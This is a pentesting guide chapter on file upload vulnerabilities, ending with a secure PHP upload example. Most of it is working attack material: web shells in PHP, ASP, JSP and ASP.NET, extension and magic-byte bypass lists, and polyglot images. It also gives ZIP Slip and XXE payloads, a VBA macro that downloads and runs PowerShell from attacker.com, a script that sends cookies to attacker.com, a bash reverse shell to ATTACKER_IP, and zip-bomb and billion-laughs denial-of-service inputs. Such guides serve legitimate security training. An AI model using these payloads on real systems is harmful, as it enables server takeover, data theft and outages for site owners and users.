# 1. FILE UPLOAD VULNERABILITIES <a name="file-upload"></a>

## 1.1 THEORY & BACKGROUND

### What Makes File Upload Dangerous?

**File upload vulnerabilities** occur when applications don't properly validate uploaded files, allowing attackers to:
- Execute arbitrary code (RCE)
- Overwrite critical files
- Store malicious content
- Perform XSS attacks
- Denial of Service
- Information disclosure

### The Role of MIME Types

**MIME (Multipurpose Internet Mail Extensions) Types** identify file content:
- **Content-Type header**: Client declares file type
- **Magic bytes**: Actual file signature (first bytes of file)
- **File extension**: Filename suffix

**Common MIME types:**
```
image/jpeg          - JPEG images
image/png           - PNG images
image/gif           - GIF images
application/pdf     - PDF documents
text/html           - HTML files
application/zip     - ZIP archives
video/mp4           - MP4 videos
application/json    - JSON data
```

**Security Issue:** Relying only on Content-Type header or file extension is INSECURE - both can be manipulated!

---

## 1.2 IDENTIFICATION & ENUMERATION

### 1.2.1 Finding Upload Functions

**Common locations:**
```
Profile picture upload
Document upload
Avatar/logo upload
Import functionality (CSV, XML, JSON)
Backup restore
Theme/plugin upload
Email attachments
File sharing features
Content management systems
```

**Testing checklist:**
```bash
# 1. Identify upload functionality
# Look for:
<input type="file">
<form enctype="multipart/form-data">

# 2. Check upload location
# Try uploading legitimate file
# Note where it's stored:
/uploads/
/files/
/media/
/attachments/
/assets/
/user_content/

# 3. Check if uploaded files are accessible
http://site.com/uploads/test.jpg

# 4. Check execution
# If PHP/ASP/JSP files can be uploaded and accessed → RCE!
```

---

## 1.3 BYPASS TECHNIQUES

### 1.3.1 Extension Blacklist Bypass

**Common blacklisted extensions:**
```
.php, .asp, .aspx, .jsp, .exe, .sh, .pl, .py, .rb
```

**Bypass methods:**

```bash
# 1. Case variation
shell.PhP
shell.pHp
shell.PHP
shell.aSp

# 2. Double extensions
shell.php.jpg
shell.jpg.php
image.png.php

# 3. Null byte injection (older versions)
shell.php%00.jpg
shell.php\x00.jpg
# Server processes as shell.php, null byte terminates string

# 4. Alternative extensions
# PHP alternatives:
.php3, .php4, .php5, .php7, .pht, .phtml, .phps, .phar
# ASP alternatives:
.asa, .cer, .aspx, .ashx, .asmx, .config
# JSP alternatives:
.jspx, .jsw, .jsv, .jspf

# 5. Adding extra dots
shell.php.
shell.php...

# 6. Adding trailing spaces
shell.php (space)
shell.php     

# 1. Special characters
shell.php::$DATA (Windows NTFS alternate data stream)
shell.php:.jpg
shell.php;.jpg

# 8. Path truncation (Windows)
shell.php[...]
# Where [...] = many characters to exceed MAX_PATH

# 9. Unicode/UTF-8 tricks
shell.ph℗ (unicode character that looks like 'p')
```

### 1.3.2 Content-Type Validation Bypass

**If server checks Content-Type header:**

```bash
# Upload request (intercepted in Burp):
POST /upload HTTP/1.1
Host: site.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--

# Change Content-Type to allowed type:
Content-Type: image/jpeg

# Server checks header, sees "image/jpeg", allows upload
# But file is still shell.php and executes!
```

### 1.3.3 Magic Bytes / File Signature Bypass

**If server checks file signature (magic bytes):**

```bash
# JPEG magic bytes: FF D8 FF
# PNG magic bytes: 89 50 4E 47
# GIF magic bytes: 47 49 46 38

# Create polyglot file (valid image + PHP code)

# Method 1: Prepend magic bytes to PHP shell
echo -e "\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46" > shell.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.jpg

# Method 2: Use exiftool to inject PHP in image metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php

# Method 3: Append PHP to valid image
cat image.jpg shell.php > polyglot.php

# Method 4: GIF + PHP
GIF89a<?php system($_GET['cmd']); ?>

# Save as shell.php
# Server checks magic bytes, sees GIF89a, accepts file
# PHP still executes!
```

### 1.3.4 Directory Traversal in Filename

```bash
# Upload with path traversal in filename
POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="../../shell.php"

# If not sanitized, file saved at:
/var/www/html/shell.php
# Instead of:
/var/www/html/uploads/shell.php

# Other attempts:
filename="../../../var/www/html/shell.php"
filename="..\..\..\..\inetpub\wwwroot\shell.aspx"
filename="/etc/passwd" (overwrite system file!)
```

### 1.3.5 Race Condition Upload

```bash
# Some applications:
# 1. Save uploaded file
# 2. Validate it
# 3. Delete if invalid

# Exploit: Access file between step 1 and 3

# Terminal 1: Upload malicious file repeatedly
while true; do
    curl -F "file=@shell.php" http://site.com/upload
done

# Terminal 2: Try to access file repeatedly
while true; do
    curl http://site.com/uploads/shell.php?cmd=id
done

# If timing is right, execute before deletion!
```

---

## 1.4 COMMON FILE FORMATS & PAYLOADS

### 1.4.1 Web Shells

**PHP Web Shell (Minimal):**
```php
<?php system($_GET['cmd']); ?>
```

**PHP Web Shell (Feature-rich):**
```php
<?php
// Simple file manager + command execution
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
if(isset($_GET['file'])) {
    echo "<pre>" . file_get_contents($_GET['file']) . "</pre>";
}
if(isset($_POST['upload'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Uploaded!";
}
?>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" name="upload" value="Upload">
</form>
```

**ASP Web Shell:**
```asp
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form("cmd")
If (szCMD <> "") Then
    Set oExec = oScript.Exec(szCMD)
    Response.Write(oExec.StdOut.ReadAll())
End If
%>
<form method="POST">
    <input type="text" name="cmd">
    <input type="submit">
</form>
```

**JSP Web Shell:**
```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>
```

### 1.4.2 Image-Based Payloads

**PHP in EXIF Data:**
```bash
# Create image with PHP in comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# Upload as image.php
# Access: http://site.com/uploads/image.php?cmd=whoami
```

**GIF Polyglot:**
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

**PNG with PHP:**
```bash
# Valid PNG + PHP code
echo -e "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system(\$_GET['cmd']); ?>" > shell.png.php
```

### 1.4.3 Archive-Based Exploits

**ZIP Slip (Path Traversal via Archive):**
```python
# Create malicious ZIP
import zipfile

# Create ZIP with path traversal
with zipfile.ZipFile('malicious.zip', 'w') as zf:
    # Add file that extracts to ../../webroot/shell.php
    zf.writestr('../../../var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>')

# Upload ZIP
# If application extracts without validation → RCE!
```

**XXE in SVG:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### 1.4.4 PDF-Based Exploits

**XSS in PDF:**
```javascript
// Create PDF with JavaScript
// Upload as .pdf
// When viewed in browser, executes JavaScript

// Tools: pdftk, qpdf, or create manually
```

**SSRF in PDF:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "http://internal-server/secret">
]>
<foo>&xxe;</foo>
```

### 1.4.5 Office Documents

**Macro in DOCX/XLSX:**
```vba
' Malicious VBA macro
Sub AutoOpen()
    Shell "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
End Sub
```

**XXE in DOCX:**
```bash
# DOCX is ZIP archive
# Extract DOCX
unzip document.docx

# Edit word/document.xml
# Add XXE payload
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document>
    <w:body>
        <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
    </w:body>
</w:document>

# Repackage
zip -r malicious.docx *
```

---

## 1.5 EXPLOITATION SCENARIOS

### 1.5.1 Complete RCE via File Upload

**Scenario 1: PHP Application**

```bash
# 1. Identify upload function
# Found: /upload.php allows image uploads

# 2. Test extension filter
# Upload test.php → Blocked
# Upload test.jpg → Allowed

# 3. Try bypass techniques
# Create polyglot:
GIF89a<?php system($_GET['cmd']); ?>

# Save as shell.php.jpg

# 4. Upload via Burp
POST /upload.php HTTP/1.1
Host: vulnerable-site.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
Content-Type: image/gif

GIF89a<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--

# 5. Response shows file saved at:
# /uploads/shell.php.jpg

# 6. Try to access:
curl http://vulnerable-site.com/uploads/shell.php.jpg?cmd=id
# If PHP executes → Success!

# 1. If .jpg not executed, try other techniques:
# - Change to .php (if allowed)
# - Try .phtml, .php5, .phar
# - Try null byte: shell.php%00.jpg
# - Try double extension: shell.jpg.php

# 8. Once RCE achieved, upgrade to reverse shell:
curl "http://vulnerable-site.com/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

**Scenario 2: ASP.NET Application**

```bash
# 1. Upload test.aspx → Blocked
# Try: test.asa, test.cer, test.config

# 2. Create ASP shell:
cat > shell.aspx << 'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request.QueryString["cmd"];
    if (cmd != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
EOF

# 3. Upload as image with aspx extension
# Change filename in Burp to: shell.aspx

# 4. Access:
curl "http://site.com/uploads/shell.aspx?cmd=whoami"
```

### 1.5.2 XSS via File Upload

**HTML File Upload:**
```html
<!-- xss.html -->
<script>
document.location='http://attacker.com/steal?cookie='+document.cookie;
</script>

<!-- Upload as HTML file -->
<!-- Send link to victim:
http://site.com/uploads/xss.html
-->
```

**SVG with JavaScript:**
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert(document.domain);
   </script>
</svg>
```

### 1.5.3 DoS via File Upload

```bash
# 1. Upload extremely large file
dd if=/dev/zero of=huge.zip bs=1M count=10000
# 10GB file

# Upload → fills disk space

# 2. Zip bomb
# Create nested ZIP archives
# Small file size, extracts to huge size
# https://www.bamsoftware.com/hacks/zipbomb/

# 3. XML bomb (Billion Laughs)
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>
```

---

## 1.6 MITIGATION & SECURE UPLOAD

```php
<?php
// SECURE FILE UPLOAD IMPLEMENTATION

// 1. Whitelist allowed extensions
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$file_extension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($file_extension, $allowed_extensions)) {
    die('Invalid file type');
}

// 2. Validate MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);

$allowed_mime = [
    'image/jpeg',
    'image/png',
    'image/gif',
    'application/pdf'
];

if (!in_array($mime_type, $allowed_mime)) {
    die('Invalid file content');
}

// 3. Verify it's actually an image (for images)
if (in_array($mime_type, ['image/jpeg', 'image/png', 'image/gif'])) {
    $image = getimagesize($_FILES['file']['tmp_name']);
    if ($image === false) {
        die('File is not a valid image');
    }
}

// 4. Limit file size (5MB)
if ($_FILES['file']['size'] > 5 * 1024 * 1024) {
    die('File too large');
}

// 5. Generate random filename (prevent overwrite)
$new_filename = bin2hex(random_bytes(16)) . '.' . $file_extension;

// 6. Store outside webroot (or with no execute permissions)
$upload_dir = '/var/uploads/'; // Outside /var/www/html
$upload_path = $upload_dir . $new_filename;

// 7. Move file
if (!move_uploaded_file($_FILES['file']['tmp_name'], $upload_path)) {
    die('Upload failed');
}

// 8. Strip EXIF data (for images) to remove embedded code
if (in_array($mime_type, ['image/jpeg', 'image/png'])) {
    $img = imagecreatefromstring(file_get_contents($upload_path));
    imagejpeg($img, $upload_path, 90);
    imagedestroy($img);
}

// 9. Store file reference in database
$stmt = $pdo->prepare("INSERT INTO uploads (user_id, filename, original_name) VALUES (?, ?, ?)");
$stmt->execute([$_SESSION['user_id'], $new_filename, $_FILES['file']['name']]);

echo "Upload successful: " . $new_filename;
?>
```

**Additional Security Measures:**

```bash
# 1. Store uploads outside webroot
/var/uploads/  # Not in /var/www/html

# 2. Serve files through script (not directly)
# download.php?id=123
# Script validates permission, then serves file with readfile()

# 3. Set proper file permissions
chmod 644 uploaded_files
# No execute permission!

# 4. Use Content-Disposition header
header('Content-Disposition: attachment; filename="' . $filename . '"');
# Forces download instead of execution

# 5. Disable script execution in upload directory (.htaccess)
# /uploads/.htaccess:
php_flag engine off
AddType text/plain .php .php3 .phtml .pht .phps

# 6. Use antivirus scanner
clamscan --infected --remove uploaded_file

# 1. Implement file quotas per user
# Prevent DoS via unlimited uploads
```

---
